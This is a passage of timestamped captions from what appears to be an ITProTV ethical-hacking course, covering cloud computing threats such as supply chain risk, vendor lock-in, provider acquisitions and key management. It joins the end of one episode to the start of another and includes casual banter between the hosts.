--> 00:37:47.405\nyou indirectly mentioned some of that.\n\n799\n00:37:47.405 --> 00:37:50.605\nIf hardware failure occurs, we don't\nhave the ability to swap it out and\n\n800\n00:37:50.605 --> 00:37:52.500\ndeal with it,\nwe're relying on the vendor to do it.\n\n801\n00:37:52.500 --> 00:37:54.070\nWhat about security clearing for\n\n802\n00:37:54.070 --> 00:37:56.830\nthe people working in\nthe vendors cloud system right?\n\n803\n00:37:56.830 --> 00:38:00.640\nWe don't know who's touching our stuff,\nit could be anybody.\n\n804\n00:38:00.640 --> 00:38:02.880\nCould be me, could be Mike,\ncould be Megan, could be anybody.\n\n805\n00:38:02.880 --> 00:38:06.500\nWe're all good but\nit could also be my evil twin, right?\n\n806\n00:38:06.500 --> 00:38:09.130\n>> Right.\n>> Skippy Adam who is out there doing harm\n\n807\n00:38:09.130 --> 00:38:10.280\nwhen nobody's around.\n\n808\n00:38:10.280 --> 00:38:12.859\nIt could be the gremlins here in our\nstudio that seem to have a lot of fun at\n\n809\n00:38:12.859 --> 00:38:13.990\nnight when nobody's around.\n\n810\n00:38:13.990 --> 00:38:15.300\n>> [LAUGH]\n>> I would love to put one of these\n\n811\n00:38:15.300 --> 00:38:16.732\ncameras on at night and\n\n812\n00:38:16.732 --> 00:38:19.550\nsee actually who's in here doing that\nbecause I have a feeling if we come in\n\n813\n00:38:19.550 --> 00:38:23.840\ntomorrow, things are also not gonna\nbe as operational as they should be.\n\n814\n00:38:23.840 --> 00:38:25.190\nAnd I don't know.\n\n815\n00:38:25.190 --> 00:38:27.100\nMaybe Nate's in there hanging out.\n\n816\n00:38:27.100 --> 00:38:28.580\n>> We're gonna put some\nnight vision cameras in.\n\n817\n00:38:28.580 --> 00:38:30.010\n>> I'm wondering somebody\nis doing something.\n\n818\n00:38:30.010 --> 00:38:31.680\nI think somebody's got it in for us.\n\n819\n00:38:31.680 --> 00:38:33.800\nMaybe Ronnie because we\nthreatened to hack him.\n\n820\n00:38:33.800 --> 00:38:37.440\nHe could just be coming in when we're gone\nand just saying, I'm gonna get those guys.\n\n821\n00:38:37.440 --> 00:38:39.280\nThey didn't hack me, but\nI'm gonna get them, right?\n\n822\n00:38:39.280 --> 00:38:40.590\nSo, all sorts of stuff could be going on.\n\n823\n00:38:40.590 --> 00:38:44.830\nThere's a list of probably easily,\nI could think of 40 different concerns and\n\n824\n00:38:44.830 --> 00:38:46.320\nrisks that are threats here.\n\n825\n00:38:46.320 --> 00:38:49.297\nWe're gonna delve deeper into some\nof these in upcoming episodes,\n\n826\n00:38:49.297 --> 00:38:52.814\nbreak them out, talk about being able to\nfigure out how to defend against them.\n\n827\n00:38:52.814 --> 00:38:57.272\nSocial engineering is on this list, making\nsure we can't modify network traffic as\n\n828\n00:38:57.272 --> 00:38:59.990\nwe're encrypting we've talked about that.\n\n829\n00:38:59.990 --> 00:39:02.500\nMaking sure that if we do encrypt,\nhere's a big one, right?\n\n830\n00:39:02.500 --> 00:39:05.690\nSo let's say we do all this stuff which\nis great we encrypt, blah, we're good.\n\n831\n00:39:05.690 --> 00:39:07.570\nNow what the hell do we do with the keys?\n\n832\n00:39:07.570 --> 00:39:08.560\nHow do we store the keys?\n\n833\n00:39:08.560 --> 00:39:13.190\nAnd more importantly, if we lose\nthe keys right, what happens then?\n\n834\n00:39:13.190 --> 00:39:16.420\nSo you know again, we may be able to put\nourselves in a position where we paint\n\n835\n00:39:16.420 --> 00:39:19.000\nourselves into a corner despite\nour best intentions and\n\n836\n00:39:19.000 --> 00:39:20.360\nbest interests to the contrary.\n\n837\n00:39:20.360 --> 00:39:22.060\nSo we gotta think about all these things.\n\n838\n00:39:22.060 --> 00:39:24.280\nVendor lock in's another big one.\n\n839\n00:39:24.280 --> 00:39:28.810\nVendor lock in because of proprietary\nusage of APIs and data formats.\n\n840\n00:39:28.810 --> 00:39:32.460\nYou want to leave and they say no\nthank you you're not going anywhere.\n\n841\n00:39:32.460 --> 00:39:35.670\nOr it's gonna take 45 days for\nus to give you all your stuff back, and\n\n842\n00:39:35.670 --> 00:39:39.210\nthen you gotta translate it into\na form that somebody else can use.\n\n843\n00:39:39.210 --> 00:39:41.508\nIt's not as big of a deal today.\n\n844\n00:39:41.508 --> 00:39:45.200\nVendor lock in is not as specifically\na concern as it may have been five,\n\n845\n00:39:45.200 --> 00:39:46.120\nsix years ago.\n\n846\n00:39:46.120 --> 00:39:48.400\nWhere at the beginning,\nkind of the wild west phase,\n\n847\n00:39:48.400 --> 00:39:53.260\nthe wild frontier phase of the cloud most\nvendors were using proprietary APIs.\n\n848\n00:39:53.260 --> 00:39:55.030\nWe're not seeing that as much today.\n\n849\n00:39:55.030 --> 00:39:58.770\nA lot more open APIs are being used, so\n\n850\n00:39:58.770 --> 00:40:04.660\nsolutions like WS Federation,\nOWAF, OWAF 2.0, SAML, XACML.\n\n851\n00:40:04.660 --> 00:40:05.550\nThese are languages and\n\n852\n00:40:05.550 --> 00:40:09.450\nprotocols and standards that are being\nused that everybody agrees on.\n\n853\n00:40:09.450 --> 00:40:12.855\nSo when they're implemented,\neverybody can move data and it's portable.\n\n854\n00:40:12.855 --> 00:40:16.530\nWe're not using what we would call black\nbox technology as much anymore, and so\n\n855\n00:40:16.530 --> 00:40:17.920\nthis is something to consider.\n\n856\n00:40:17.920 --> 00:40:20.980\nWhat about the cloud provider\nbeing acquired by another company?\n\n857\n00:40:20.980 --> 00:40:24.220\nSomebody else buys your stuff\nbecause they buy the cloud provider.\n\n858\n00:40:24.220 --> 00:40:26.020\nYou want to do business with X.\n\n859\n00:40:26.020 --> 00:40:30.120\nX gets bought by Y, which is not\nuncommon in our industry today, right?\n\n860\n00:40:30.120 --> 00:40:34.480\nI mean look at all the people that\nare going out on buying sprees and binges.\n\n861\n00:40:34.480 --> 00:40:36.860\nHappens all the time, so\nyou may now have to make a choice.\n\n862\n00:40:36.860 --> 00:40:39.370\nYou may want to eject and\nparachute out of that platform.\n\n863\n00:40:39.370 --> 00:40:42.880\nBecause you don't want to be owned by\na foreign national who may now have bought\n\n864\n00:40:42.880 --> 00:40:46.610\nthe company that you decided to go with\nbecause they were specific to your country\n\n865\n00:40:46.610 --> 00:40:51.270\nand would keep your data inside the\ngeographic boundary of your jurisdiction.\n\n866\n00:40:51.270 --> 00:40:52.910\nIf you're in the government,\nif you're in the military,\n\n867\n00:40:52.910 --> 00:40:54.610\nif you're in certain regulated industries,\n\n868\n00:40:54.610 --> 00:40:59.610\nyou can't allow data to leave the national\nborder because of legal requirements.\n\n869\n00:40:59.610 --> 00:41:01.940\nIf your hosting company gets\nbought by a foreign entity,\n\n870\n00:41:01.940 --> 00:41:03.520\nyou can't host with them anymore.\n\n871\n00:41:03.520 --> 00:41:06.590\nThat's a major issue, so\nthat's something to consider as well.\n\n872\n00:41:06.590 --> 00:41:09.810\nAll these things are on this list and\nwe'll be talking more about some of these\n\n873\n00:41:09.810 --> 00:41:12.010\nas we go and\nwe continue our conversations.\n\n874\n00:41:12.010 --> 00:41:12.800\n>> All right, Adam.\n\n875\n00:41:12.800 --> 00:41:15.250\nWell, great look there at\nsome Cloud technologies.\n\n876\n00:41:15.250 --> 00:41:18.220\nReally more about the threats\nthat we face that we might or\n\n877\n00:41:18.220 --> 00:41:20.400\nmight not have thought as\nwe move out into the Cloud.\n\n878\n00:41:20.400 --> 00:41:23.865\nAnd a look at some of\nthe different types of attacks that\n\n879\n00:41:23.865 --> 00:41:25.735\ncould compromise our cloud services.\n\n880\n00:41:25.735 --> 00:41:28.565\nSo we appreciate that,\nhope everybody out there enjoyed watching.\n\n881\n00:41:28.565 --> 00:41:31.085\nSigning off for ITpro TV,\nI'm Mike Rodrick.\n\n882\n00:41:31.085 --> 00:41:33.300\n>> I'm gonna go spam\nsomebody from my fridge.\n\n883\n00:41:33.300 --> 00:41:34.775\n>> [Laughing] And we'll see you next time.\n\n884\n00:41:34.775 --> 00:41:38.095\n>> Take care everybody.\n\n",

Shield my eyes from the bright\nlight as we get going.\n\n4\n00:00:17.870 --> 00:00:21.840\n>> Welcome to another exciting episode\nhere in the sunny State of Florida.\n\n5\n00:00:21.840 --> 00:00:26.270\n[LAUGH] Our certified\nethical hacker version 9.\n\n6\n00:00:26.270 --> 00:00:31.070\nSpecifically in this episode, we're going\nto be continuing our conversation n Cloud\n\n7\n00:00:31.070 --> 00:00:35.310\ncomputing and we really want to continue\nlooking at some of the threats that Cloud\n\n8\n00:00:35.310 --> 00:00:40.560\ncomputing basically brings to bear or\nintroduces, I should say.\n\n9\n00:00:40.560 --> 00:00:42.390\n>> Bear?\nYou can go hunting for bear?\n\n10\n00:00:42.390 --> 00:00:45.130\n>> Yes, I don't think in Florida you can.\n\n11\n00:00:45.130 --> 00:00:46.380\n>> Gators.\n>> Gators you can.\n\n12\n00:00:46.380 --> 00:00:47.610\nI think they're okay.\n\n13\n00:00:47.610 --> 00:00:49.080\n>> Well, not if you're a Gator.\n\n14\n00:00:49.080 --> 00:00:50.900\nYou don't like being\nhunted if you're a Gator.\n\n15\n00:00:50.900 --> 00:00:52.640\nIf you're not a Gator it's okay,\nif you are a Gator,\n\n16\n00:00:52.640 --> 00:00:54.530\nyou probably don't want to do that.\n\n17\n00:00:54.530 --> 00:00:55.310\nSo anyway,\n\n18\n00:00:55.310 --> 00:00:59.360\nwe'll actually talk about stuff that makes\nsense, here I am free associating again.\n\n19\n00:00:59.360 --> 00:01:03.720\nIt's the blinding light here in the studio\nthat is causing my brain to addle and\n\n20\n00:01:03.720 --> 00:01:04.450\nto go off topic.\n\n21\n00:01:04.450 --> 00:01:07.530\nSo, we're going to continue\ntalking about threats and\n\n22\n00:01:07.530 --> 00:01:09.920\nin the last episode we listed a bunch out.\n\n23\n00:01:09.920 --> 00:01:12.520\nMike was very kind to help me\nkind of think about what those\n\n24\n00:01:12.520 --> 00:01:13.550\ntop things would be.\n\n25\n00:01:13.550 --> 00:01:15.540\nWhat were the top benefits,\nif you remember.\n\n26\n00:01:15.540 --> 00:01:18.160\nIf you've been through that\nepisode of Cloud computing.\n\n27\n00:01:18.160 --> 00:01:19.530\nBut also what were some\nof the top threats?\n\n28\n00:01:19.530 --> 00:01:22.440\nThings we would think about that we\nwould want to be concerned about as\n\n29\n00:01:22.440 --> 00:01:23.540\nethical hackers.\n\n30\n00:01:23.540 --> 00:01:27.940\nThings like the loss of control, because\nwe're trusting a vendor, a third party.\n\n31\n00:01:27.940 --> 00:01:30.300\nWe call them the Cloud Service Provider,\nright?\n\n32\n00:01:30.300 --> 00:01:31.900\nTo be able to do a lot of this for\n\n33\n00:01:31.900 --> 00:01:36.730\nus based on the service model we may\nbe consuming, IS Pass versus SAS.\n\n34\n00:01:36.730 --> 00:01:40.230\nWe are trusting not just the vendor,\nwe didn't talk about this one yet, but\n\n35\n00:01:40.230 --> 00:01:44.360\nwe'll throw it in here now, we'll build on\nit, but we are accepting not just the risk\n\n36\n00:01:44.360 --> 00:01:47.260\nof dealing with the vendor but\nalso supply chain risk.\n\n37\n00:01:47.260 --> 00:01:48.801\nAnother one that [CROSSTALK].\n\n38\n00:01:48.801 --> 00:01:52.348\nBut we're essentially taking on\nthe vendor and all of their vendors,\n\n39\n00:01:52.348 --> 00:01:56.679\ntheir outsourced relationships become our\nproblem as a customer to manage through,\n\n40\n00:01:56.679 --> 00:01:58.850\nbecause now we're accepting them.\n\n41\n00:01:58.850 --> 00:02:00.760\nNow we have to trust everybody they trust.\n\n42\n00:02:00.760 --> 00:02:01.880\nWe may not know.\n\n43\n00:02:01.880 --> 00:02:03.300\nIn many cases who they are, do we know?\n\n44\n00:02:03.300 --> 00:02:03.800\nDo any of you?\n\n45\n00:02:03.800 --> 00:02:04.920\nI don't know.\n>> Right.\n\n46\n00:02:04.920 --> 00:02:07.060\n>> Do you know who Amazon\nbuys hardware from?\n\n47\n00:02:07.060 --> 00:02:07.610\n>> No.\n\n48\n00:02:07.610 --> 00:02:09.650\n>> I don't either, and\nI don't think anybody else does,\n\n49\n00:02:09.650 --> 00:02:11.780\nbecause they keep that secret,\nthey don't tell us, right?\n\n50\n00:02:11.780 --> 00:02:13.930\n>> Who's their A/C vendor for\ntheir air conditioning system?\n\n51\n00:02:13.930 --> 00:02:18.150\n>> All that kind of stuff, hopefully not\nthe same people that were vendors for\n\n52\n00:02:18.150 --> 00:02:21.175\nAtari cuz well, boy, that would\njust that wouldn't be good, right?\n\n53\n00:02:21.175 --> 00:02:22.850\nSo, we want to know these things, but\n\n54\n00:02:22.850 --> 00:02:25.200\nthe reality is we probably don't\nhave this ability into it.\n\n55\n00:02:25.200 --> 00:02:26.180\nThis is another risk.\n\n56\n00:02:26.180 --> 00:02:29.910\nAnother one that we really didn't even\ntalk about but can be huge as well.\n\n57\n00:02:29.910 --> 00:02:35.190\nSupply chain risk, probably one of\nthe biggest areas right now in IT security\n\n58\n00:02:35.190 --> 00:02:39.740\nthat we are dealing with overall in terms\nof risk propagation and the growth of risk\n\n59\n00:02:39.740 --> 00:02:43.860\nwithin the enterprise is this\ncontinuously spreading supply chain.\n\n60\n00:02:43.860 --> 00:02:46.980\n>> That we have to figure out how to\nmanage through as we contract for\n\n61\n00:02:46.980 --> 00:02:47.550\nservices.\n\n62\n00:02:47.550 --> 00:02:49.780\nBecause it's not just\nthe person we deal with.\n\n63\n00:02:49.780 --> 00:02:52.370\nIt's the 25 other vendors\nthat are in that chain.\n\n64\n00:02:52.370 --> 00:02:54.250\nThat may or may not be compliant,\n\n65\n00:02:54.250 --> 00:02:57.620\nthat are bringing that risk forward to\nthe table for us, so that's a big issue.\n\n66\n00:02:57.620 --> 00:03:00.230\nA lot of customers,\na lot of my customers particularly, but\n\n67\n00:03:00.230 --> 00:03:03.950\na lot of customers overall are actually\nnegotiating into their Cloud hosting\n\n68\n00:03:03.950 --> 00:03:07.460\ncontracts the fact that they want\nvisibility into the supply chain.\n\n69\n00:03:07.460 --> 00:03:11.610\nAnd the fact that vendors, that they\nare going to do business with as the lead,\n\n70\n00:03:11.610 --> 00:03:15.660\nhave to actually certify their supply\nchain to be compliant at a certain level\n\n71\n00:03:15.660 --> 00:03:18.120\nfor risk management, or\nthey can't do business.\n\n72\n00:03:18.120 --> 00:03:20.370\nThis is a really big issue today.\n\n73\n00:03:20.370 --> 00:03:24.940\nThings like that, a breach in law,\nabuse of cloud services,\n\n74\n00:03:24.940 --> 00:03:29.540\nI'm gonna put up Napster,\nSilk Road I'm gonna put up, I don't know,\n\n75\n00:03:29.540 --> 00:03:33.020\ntake your pick,\non any of the dark web leaning sites, and\n\n76\n00:03:33.020 --> 00:03:36.110\nI'm gonna run a business that's\nnot quite ethical, right?\n\n77\n00:03:36.110 --> 00:03:39.350\nAnd, as a result,\nI'm gonna abuse the Cloud service.\n\n78\n00:03:39.350 --> 00:03:41.400\nI'm gonna use it to attack others.\n\n79\n00:03:41.400 --> 00:03:46.580\nI'm gonna put an orbital platform in place\nwhere I can launch Cloud service attacks\n\n80\n00:03:46.580 --> 00:03:48.060\nfrom a vendor's site and\n\n81\n00:03:48.060 --> 00:03:52.290\nI'm gonna claim to be doing\nlegitimate work all along the way.\n\n82\n00:03:52.290 --> 00:03:55.820\nThese are all legitimate things and\nthings that can and indeed do happen.\n\n83\n00:03:55.820 --> 00:03:59.280\nInsecure interfaces in the use of\nproprietaries we talked about and\n\n84\n00:03:59.280 --> 00:04:01.820\nblack boxed non secured APIs.\n\n85\n00:04:01.820 --> 00:04:05.330\nThis is less of a concern but\nstill a concern today.\n\n86\n00:04:05.330 --> 00:04:08.010\nYeah, we have to think about\nthe fact that if we're not using\n\n87\n00:04:08.010 --> 00:04:11.640\ncode that is going to be up to standard,\nthere may be something to hide there.\n\n88\n00:04:11.640 --> 00:04:13.520\nI'm not suggesting it, I wanna be clear.\n\n89\n00:04:13.520 --> 00:04:16.070\nI'm not suggesting that\nvendors that don't use\n\n90\n00:04:16.070 --> 00:04:19.440\nstandardized open APIs have anything\nto hide and doing anything wrong.\n\n91\n00:04:19.440 --> 00:04:21.560\nQuite the opposite,\nI'm not saying that at all.\n\n92\n00:04:21.560 --> 00:04:23.980\nI'm just pointing out that we don't know,\nand\n\n93\n00:04:23.980 --> 00:04:27.990\nthat there's always the additional\npotential there, because we can't see\n\n94\n00:04:27.990 --> 00:04:30.900\nthat there could be something we're\nnot aware of, whereas open APIs.\n\n95\n00:04:30.900 --> 00:04:34.235\nAPIs that are standardized\nthat are vetted and\n\n96\n00:04:34.235 --> 00:04:37.885\nare constantly assessed, are gonna have\nknown weaknesses and vulnerabilities.\n\n97\n00:04:37.885 --> 00:04:41.275\nIt's not like using open APIs and normal,\n\n98\n00:04:41.275 --> 00:04:44.415\nsecurely vetted code means\nyou have no vulnerabilities.\n\n99\n00:04:44.415 --> 00:04:48.775\nIt just means that the ones that we know\nabout are publicly made available, and\n\n100\n00:04:48.775 --> 00:04:49.675\nthey are patched.\n\n101\n00:04:49.675 --> 00:04:50.765\nThey are documented.\n\n102\n00:04:50.765 --> 00:04:51.755\nThey are addressed.\n\n103\n00:04:51.755 --> 00:04:55.235\nAnd you're less likely to fall prey to\nthem, because they are being dealt with.\n\n104\n00:04:55.235 --> 00:04:58.470\nThis is the whole idea behind\nopen sourced anything in\n\n105\n00:04:58.470 --> 00:04:59.760\nan open source development model.\n\n106\n00:04:59.760 --> 00:05:02.410\nLook at Linux and\nhow successful it's been as a platform.\n\n107\n00:05:02.410 --> 00:05:06.080\nBecause you have dedicated people doing\nnothing but maintaining that platform and\n\n108\n00:05:06.080 --> 00:05:08.770\nimmediately as the community finds\nsomething in theory, anyway.\n\n109\n00:05:08.770 --> 00:05:13.120\nBut it's important enough, addressing it\nand fixing it and talking about it, so\n\n110\n00:05:13.120 --> 00:05:14.170\nwe know what's there.\n\n111\n00:05:14.170 --> 00:05:16.650\nWhen was the last time you heard people\ntalk about the source code for Windows?\n\n112\n00:05:16.650 --> 00:05:18.740\n>> Never.\n>> At least not in a polite and\n\n113\n00:05:18.740 --> 00:05:19.417\nmeaningful way anyway.\n\n114\n00:05:19.417 --> 00:05:20.070\n>> [LAUGH]\n>> No, of course not.\n\n115\n00:05:20.070 --> 00:05:22.055\nIt's like, that darn Windows, right?\n\n116\n00:05:22.055 --> 00:05:23.780\n>> [LAUGH]\n>> Stupid thing's not working the right\n\n117\n00:05:23.780 --> 00:05:25.400\nway again but the reality is\n>> Yeah,\n\n118\n00:05:25.400 --> 00:05:27.930\nwe just don't know what's\ngoing on there under the hood.\n\n119\n00:05:27.930 --> 00:05:29.580\nIt really is kind of a big question mark.\n\n120\n00:05:29.580 --> 00:05:31.295\nThat would be a great logo for\nthem by the way.\n\n121\n00:05:31.295 --> 00:05:32.690\n>> [LAUGH]\n>> Instead of the colorful flag,\n\n122\n00:05:32.690 --> 00:05:36.790\nthey could just put a big question mark, a\nbefuddled person with a big question mark.\n\n123\n00:05:36.790 --> 00:05:40.840\nAnd that's essentially what it is, right?\n\n124\n00:05:40.840 --> 00:05:43.165\nWe just solved the marketing\nproblem right there guys.\n\n125\n00:05:43.165 --> 00:05:44.320\n>> [LAUGH]\n>> Be in touch!\n\n126\n00:05:44.320 --> 00:05:47.130\nWe'll give you the graphic and\nwe'll tell you what it should look like.\n\n127\n00:05:47.130 --> 00:05:48.710\nAlright, so Cloud computing threats.\n\n128\n00:05:48.710 --> 00:05:49.590\nLots of different things.\n\n129\n00:05:49.590 --> 00:05:51.320\nInsufficient due diligence.\n\n130\n00:05:51.320 --> 00:05:52.530\nWe've talked about this.\n\n131\n00:05:52.530 --> 00:05:55.630\nUnknown, unidentified,\nuncharacterized risk.\n\n132\n00:05:55.630 --> 00:05:57.390\nWe're not sure if we're\ndoing the right thing for\n\n133\n00:05:57.390 --> 00:05:59.310\nthe right reasons at the right time.\n\n134\n00:05:59.310 --> 00:06:01.950\nThe shared technology\nconcerns that Mike brought up\n\n135\n00:06:01.950 --> 00:06:05.180\nwith the concept of multi-tenant\nenvironment, right?\n\n136\n00:06:05.180 --> 00:06:06.430\nThis is an issue.\n\n137\n00:06:06.430 --> 00:06:08.930\nWhat about unlooked for\nand unscheduled updates?\n\n138\n00:06:08.930 --> 00:06:11.010\nWe talked about the value proposition,\n\n139\n00:06:11.010 --> 00:06:13.470\none of them being that\nthe vendor's gonna maintain that.\n\n140\n00:06:13.470 --> 00:06:16.710\nBut what about the fact that we may not be\nprepared to move to a new platform, and\n\n141\n00:06:16.710 --> 00:06:19.490\nthe vendor makes the decision for us?\n\n142\n00:06:19.490 --> 00:06:20.730\n>> It could also be an issue.\n\n143\n00:06:20.730 --> 00:06:23.530\nThose of you running on Office 365 and\n\n144\n00:06:23.530 --> 00:06:28.130\nnot limiting this particular talk track\nto Microsoft by any means, wanna be fair.\n\n145\n00:06:28.130 --> 00:06:32.160\nAny and all Cloud vendors are capable of\ndoing this, especially in the SAS world.\n\n146\n00:06:32.160 --> 00:06:36.950\nBut those of you on Office 365, you know\nthat you may wake up one morning and\n\n147\n00:06:36.950 --> 00:06:39.690\nfind out you've been migrated to\na newer version of the platform.\n\n148\n00:06:39.690 --> 00:06:44.040\nNow to be fair, and to be totally\ntransparent, in Microsoft's defense they\n\n149\n00:06:44.040 --> 00:06:48.770\ndo give you notification as a customer,\nthey do give you many notifications, and\n\n150\n00:06:48.770 --> 00:06:52.120\nthey do give you options to push\noff that update traditionally for\n\n151\n00:06:52.120 --> 00:06:55.110\nat least one, if not two cycles but\nat some point, right,\n\n152\n00:06:55.110 --> 00:06:57.280\nthey're gonna come back and\nsay okay Guys guess what?\n\n153\n00:06:57.280 --> 00:07:00.980\nYou're like the last people on the planet\nthat are running this and it's time for\n\n154\n00:07:00.980 --> 00:07:02.320\nyou to let go, right.\n\n155\n00:07:02.320 --> 00:07:05.750\nAnd so,they are gonna force you\nat some point to move forward.\n\n156\n00:07:05.750 --> 00:07:09.940\nYou've gotta pay attention like\nnever before in this environment\n\n157\n00:07:09.940 --> 00:07:13.720\nto those kind of things because you\nmay literally wake up one morning and\n\n158\n00:07:13.720 --> 00:07:16.930\nfind out that you're infrastructure\nhas moved without you and\n\n159\n00:07:16.930 --> 00:07:20.850\nthat you now have to worry about not just\nall the concerns associated with that.\n\n160\n00:07:20.850 --> 00:07:23.780\nBut what about training users on\nthe back end to survive in the brave,\n\n161\n00:07:23.780 --> 00:07:26.430\nnew world of Office 2016, right?\n\n162\n00:07:26.430 --> 00:07:29.810\nThis can be a really disruptive\nissue in the organization\n\n163\n00:07:29.810 --> 00:07:31.150\nthat can lead to compromise.\n\n164\n00:07:31.150 --> 00:07:32.630\nAnd lead to hacking opportunities.\n\n165\n00:07:32.630 --> 00:07:34.600\nBecause people are unsure\nof what they're doing.\n\n166\n00:07:34.600 --> 00:07:37.540\nAnd they do things they wouldn't\nnormally do, that leads to and security.\n\n167\n00:07:37.540 --> 00:07:39.780\n>> Yeah\n>> I'm gonna throw down the towel and\n\n168\n00:07:39.780 --> 00:07:41.755\nwe're done, cuz what else can\nyou say about that, right?\n\n169\n00:07:41.755 --> 00:07:43.790\n>> [LAUGH]\n>> It's gonna be a robot world,\n\n170\n00:07:43.790 --> 00:07:44.450\nI'm convinced.\n\n171\n00:07:44.450 --> 00:07:47.900\nAt some point we're just\ngonna basically disappear and\n\n172\n00:07:47.900 --> 00:07:50.565\nthe Clouds are gonna run and\nthey're gonna fight each other.\n\n173\n00:07:50.565 --> 00:07:51.765\n[LAUGH]\n>> And then there will be like a mega\n\n174\n00:07:51.765 --> 00:07:54.415\nCloud and then that will rule the world.\n\n175\n00:07:54.415 --> 00:07:55.445\n>> We could make a movie about that.\n\n176\n00:07:55.445 --> 00:07:56.265\n>> We could.\nWe should.\n\n177\n00:07:56.265 --> 00:07:57.885\n>> It would be a very short movie.\n\n178\n00:07:57.885 --> 00:07:58.596\nTwo Clouds fighting each other.\n\n179\n00:07:58.596 --> 00:08:00.056\nOne Cloud dies, falls out of the sky.\n\n180\n00:08:00.056 --> 00:08:01.812\nWe could make really cool graphics for\nthat.\n\n181\n00:08:01.812 --> 00:08:04.108\nAnd then like,\nthe other cloud wins laughs.\n\n182\n00:08:04.108 --> 00:08:06.487\n>> [INAUDIBLE]\n>> We can save a lot of money on paying\n\n183\n00:08:06.487 --> 00:08:08.432\nactors and\nactresses because we'd have Cloud.\n\n184\n00:08:08.432 --> 00:08:12.960\n>> Cuz there's no Cloud unions, so the\nClouds would essentially work for nothing,\n\n185\n00:08:12.960 --> 00:08:15.792\nfor vapor, basically,\nis what we would pay them.\n\n186\n00:08:15.792 --> 00:08:18.969\nYeah, here we are so\nit's like Pinky and the Brain.\n\n187\n00:08:18.969 --> 00:08:19.758\nWhat are we going to do tonight?\n\n188\n00:08:19.758 --> 00:08:21.660\nTake over the world.\n\n189\n00:08:21.660 --> 00:08:22.770\n>> Right.\nSame thing we do every night.\n\n190\n00:08:22.770 --> 00:08:24.192\n>> Absolutely.\nDo you ever see,\n\n191\n00:08:24.192 --> 00:08:28.927\nyou've probably seen Pinky and the Brain,\nbut do you ever watch Rick and Morty?\n\n192\n00:08:28.927 --> 00:08:29.552\n>> No.\n\n193\n00:08:29.552 --> 00:08:30.318\n>> You've never seen Rick and Morty?\n\n194\n00:08:30.318 --> 00:08:32.510\nMegan, you ever seen Rick and Morty?\n\n195\n00:08:32.510 --> 00:08:34.850\nRick and Morty is awesome,\nright up there with Bob's Burgers.\n\n196\n00:08:34.850 --> 00:08:36.260\n>> Really?\n>> And American Dad.\n\n197\n00:08:36.260 --> 00:08:37.630\nJust so cool.\n\n198\n00:08:37.630 --> 00:08:39.950\nIf you have never seen Rick and Morty-\n>> I'm gonna check it out.\n\n199\n00:08:39.950 --> 00:08:41.815\n>> Just those of you that\nare listening that don't know,\n\n200\n00:08:41.815 --> 00:08:43.480\nyou're gonna be in for a shock.\n\n201\n00:08:43.480 --> 00:08:46.020\nIt is a little bit risqué, shall we say.\n\n202\n00:08:46.020 --> 00:08:49.060\nNot like in a crazy kind of way,\njust language.\n\n203\n00:08:49.060 --> 00:08:51.160\nA lot of of really strong language.\n\n204\n00:08:51.160 --> 00:08:53.790\nBut one of the funniest\nthings I’ve ever seen.\n\n205\n00:08:53.790 --> 00:08:54.654\n>> Really?\n\n206\n00:08:54.654 --> 00:09:00.180\n>> My God, you just, they do a bit getting\nyour, I can’t say the actual word on TV.\n\n207\n00:09:00.180 --> 00:09:04.120\nBut getting your equivalent of stuff\ntogether, four letter word begins with s,\n\n208\n00:09:04.120 --> 00:09:06.000\nends with t, has h, i in the middle.\n\n209\n00:09:06.000 --> 00:09:07.780\nGetting all that stuff together.\n\n210\n00:09:07.780 --> 00:09:11.080\nThey do this whole bit on how\nyou like have to do that.\n\n211\n00:09:11.080 --> 00:09:12.730\nIt is just one of the funniest\nthings you have ever,\n\n212\n00:09:12.730 --> 00:09:14.090\nyou've got watch Rick and Morty.\n\n213\n00:09:14.090 --> 00:09:15.210\n>> Know what we're doing tonight, then,.\n\n214\n00:09:15.210 --> 00:09:17.090\n>> Awesome commentary on\nthe Cloud right there.\n\n215\n00:09:17.090 --> 00:09:19.070\nAnyway, so let's get back to\nwhat we're talking about.\n\n216\n00:09:19.070 --> 00:09:21.420\nSo, we're here to talk about\nall these different threats.\n\n217\n00:09:21.420 --> 00:09:24.310\nAnd going through all these\ndifferent kind of things\n\n218\n00:09:24.310 --> 00:09:26.530\nbecomes really important\nin the mind of the CH,\n\n219\n00:09:26.530 --> 00:09:29.820\nbecause we keep talking about the fact\nthat it’s about hacking, right?\n\n220\n00:09:29.820 --> 00:09:32.320\nAnd, yeah, the bad people are gonna\ncome and take it away from you,\n\n221\n00:09:32.320 --> 00:09:35.670\nyou’re gonna stand there and\nyou're gonna mirror those attacks back and\n\n222\n00:09:35.670 --> 00:09:38.340\ndefend against them,\nunderstanding the mind of the hacker.\n\n223\n00:09:38.340 --> 00:09:40.920\nAnd then as a result,\nacting accordingly and\n\n224\n00:09:40.920 --> 00:09:44.520\nhopefully beating them right to the\nexploit and figuring out how to defend.\n\n225\n00:09:44.520 --> 00:09:46.590\nThis is what the certified\nethical hacker has to do.\n\n226\n00:09:46.590 --> 00:09:50.290\nSo, keep in mind that if you\ncan understand the Cloud,\n\n227\n00:09:50.290 --> 00:09:54.500\nunderstand the threats as an ethical\nhacker, you're gonna be more likely\n\n228\n00:09:54.500 --> 00:09:58.850\nto find these concerns and identify them,\nand therefore, be able to take action.\n\n229\n00:09:58.850 --> 00:10:01.210\nBut because of the split brain syndrome,\n\n230\n00:10:01.210 --> 00:10:06.520\nthe dynamic nature of this relationship\nbetween us and the Cloud vendor,\n\n231\n00:10:06.520 --> 00:10:10.530\nthere are so many things we don't\ncontrol directly as the customer and, or\n\n232\n00:10:10.530 --> 00:10:15.120\nas the security professional, that there's\na limit to what we're gonna be able to do.\n\n233\n00:10:15.120 --> 00:10:18.300\nBecause we have to rely on the fact\n\n234\n00:10:18.300 --> 00:10:21.720\nthat the Cloud provider is doing\na lot of these things for us.\n\n235\n00:10:21.720 --> 00:10:24.310\nThis is a common theme\nwe keep coming back to.\n\n236\n00:10:24.310 --> 00:10:27.550\nAnd if we're not aware of that, if we\ndon't know what they're doing, if we're\n\n237\n00:10:27.550 --> 00:10:31.130\nnot sure that the Cloud provider's up\nto the job, we may have a problem.\n\n238\n00:10:31.130 --> 00:10:35.880\nThe biggest thing you can do in the Cloud\nas an ethical hacker to prevent attacks,\n\n239\n00:10:35.880 --> 00:10:40.810\nto prevent exposure, is to think\nabout how I can be as focused on\n\n240\n00:10:40.810 --> 00:10:45.170\ndue diligence up front in the relationship\nwith the Cloud provider as I can be,.\n\n241\n00:10:45.170 --> 00:10:50.020\nMeaning, how can I as a ethical hacker\nwho's gonna advise my 